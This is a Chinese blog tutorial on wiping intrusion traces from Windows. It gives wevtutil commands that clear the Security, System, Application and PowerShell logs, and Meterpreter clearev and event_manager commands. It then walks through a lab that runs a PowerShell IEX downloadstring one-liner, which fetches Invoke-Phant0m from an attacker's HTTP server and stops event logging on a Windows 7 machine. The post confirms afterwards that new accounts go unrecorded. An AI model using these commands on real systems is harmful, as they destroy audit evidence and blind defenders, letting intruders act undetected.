Windows痕迹清除
Windows日志
如何查看：
事件查看器->windows日志
win+r eventvwr.msc

保存路径：
C:\Windows\System32\winevt\Logs

（1）在控制面板中的管理工具中，本地安全策略中的本地策略中的审核策略一些事件的开启（以管理员身份运行）
（2）在事件查看器中的安全，右键点击属性，查看日志的路径


Windows日志清理
（1）wevtutil.exe：
用于检索有关事件日志和发布者的信息，安装和卸载事件清单，运行查询以及导出，存档和清除日志

#获取security的最近十条日志
wevtutil.exe qe Security /f:text /rd:true /c:10
#获取security的前十条日志
wevtutil.exe qe Security /f:text /c:10
#默认视图xml查看（text视图不会输出EventRecordID）
wevtutil.exe qe Security /rd:true /c:10

#导出security所有日志到1.evtx
wevtutil.exe epl security 1.evtx

wevtutil cl security
wevtutil cl system
wevtutil cl application
wevtutil cl “windows powershell”

有相关的命令可以使用


meterpreter清理日志
（2）meterpreter清理日志（必须是在管理员的权限下才能清除）
删除所有在渗透过程中使用的工具
删除之前添加的账号：net user username /del
删除应用程序，系统安全日志：clearev #分别清除了应用程序，系统和安全模块的日志记录。
关闭所有的meterpreter连接：sessions -K

查看事件日志：run event_manager -i
删除事件日志：run event_manager -c

停止日志记录工具
https://github.com/hlldz/Invoke-Phant0m

日志进程分析工具
Process Hacker 2


利用脚本让日志功能失效，无法记录日志
powershell “IEX(new-object system.net.webclient).downloadstring(‘http://192.168.231.147:8000/Invoke-Phant0m.ps1’);Invoke-Phant0m”

我来大家讲解一下具体的停止日志记录步骤吧
首先，下载Invoke-Phant0m到klai上进行监听，也就是这个脚本


我们放入到kali的tools下

打开python中的http服务进行监听

我们查看一下win7的日志进程是哪个，看PID，打开任务管理器，找window服务主进程，svhost.exe

进入服务后，找到eventlog，看到日志记录的进程时812

进入Process Hacker查看一下进程

点击查看一下进程

我这里是已经显示停止了日志的进程了，因为刚才实验的时候，忘记截图了，没能还原之前的记录了。

之前的是有log记录的，我们已经在kali中监听了，我们返回到win7中执行以下脚本，看看有没有回应
powershell “IEX(new-object system.net.webclient).downloadstring(‘http://192.168.231.147:8000/Invoke-Phant0m.ps1’);Invoke-Phant0m”



这里就显示已经停止了。

这里也返回了回应，实验成功了。这时候，我们创建一个用户，看看在事件查看器中是否记录我们的创建的日志


发现并没有被记录，停止日志记录成功了。
————————————————

                            版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。
                        
原文链接：https://blog.csdn.net/lza20001103/article/details/137750020